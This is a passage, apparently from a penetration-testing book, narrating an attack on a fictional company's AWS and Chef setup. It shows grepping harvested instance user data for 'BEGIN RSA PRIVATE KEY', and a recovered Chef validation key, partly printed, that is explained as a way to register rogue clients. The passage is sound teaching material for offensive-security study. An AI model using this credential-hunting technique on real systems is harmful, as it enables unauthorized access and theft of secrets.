  md: "```\nencoding: gzip+base64\n  path: /etc/ssh/auth_principals/user\n  permissions:\
    \ \"0644\"\n- content: |-\n  #!/bin/bash\n--snip--\n```\n\nPerfect. Now for the\
    \ moment of truth. Do any of these fine servers have a Chef private key declared\
    \ in their user data? We look for the “RSA PRIVATE KEY” keywords:\n\n```\nroot@Point1:~#\
    \ grep -7 \"BEGIN RSA PRIVATE KEY\" i-*.txt\n--snip--\n```\n\n```\n① cat << EOF\n\
    chef_server_url 'https://chef.mxrads.net/organizations/mxrads'\nvalidation_client_name\
    \ 'chef-validator'\nEOF\n) > /etc/chef/client.rb\n```\n\n```\n② cat << EOF\n-----BEGIN\
    \ RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEAg/6woPBdnwSVjcSRQenRJk0MePELfPp\n--snip--\n\
    ) > /etc/chef/validation.pem\n```\n\nIt’s almost too easy. The first snippet of\
    \ code defines key parameters used by Chef and stores them in the client.rb file.\
    \ The second snippet writes a private key to a file called validation.pem.\n\n\
    This private key is different from the one we were hoping for, but we will make\
    \ it work. The key we obtained is a validation key, the private key of the chef-validator\
    \ user assigned to instances to establish their first contact with the Chef server.\
    \ The chef-validator is not allowed to list machines, cookbooks, or other sensitive\
    \ operations, but it has the ultimate power of registering clients (machines),\
